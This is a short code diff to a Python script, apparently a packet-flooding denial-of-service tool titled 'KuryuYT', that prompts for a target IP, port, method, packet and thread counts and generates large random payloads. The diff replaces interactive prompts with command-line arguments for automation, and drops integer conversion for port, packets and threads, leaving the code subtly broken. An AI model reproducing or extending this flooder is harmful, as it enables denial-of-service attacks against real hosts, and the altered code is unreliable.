@@ -8,11 +8,11 @@ import time
 
 os.system('color ' +random.choice(['a', 'b', 'c', 'd', 'e'])+ " & title KuryuYT")
 
-ip = str(input(">> IP Address :"))
-port = int(input(">> Port : "))
-choice = str(input(">> Method : "))
-times = int(input(">> Packets : "))
-threads = int(input(">> Threads : "))
+ip = sys.argv[1]
+port = sys.argv[2]
+choice = sys.argv[3]
+times = sys.argv[4]
+threads = sys.argv[5]
 def run():
 	data = random._urandom(600000)
 	i = random.choice(("[*]","[!]","[#]"))
